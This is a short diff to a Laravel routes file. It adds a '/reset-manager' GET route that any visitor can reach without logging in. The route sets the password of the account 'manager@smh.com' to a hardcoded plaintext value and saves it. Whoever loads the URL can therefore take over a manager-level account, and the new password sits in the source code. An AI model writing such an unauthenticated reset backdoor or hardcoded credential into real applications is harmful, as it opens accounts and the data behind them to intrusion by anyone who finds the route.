@@ -740,6 +740,19 @@ Route::get('/test-export-direct', function() {
         echo "</div>";
     }
 });
+use Illuminate\Support\Facades\Hash;
+use App\Models\User;
+
+Route::get('/reset-manager', function () {
+
+    $user = User::where('email', 'manager@smh.com')->first();
+
+    $user->password = Hash::make('Smhbusiness@');
+
+    $user->save();
+
+    return 'OK';
+});
 
 // =============================================
 // 35. ROUTES DE REDIRECTION
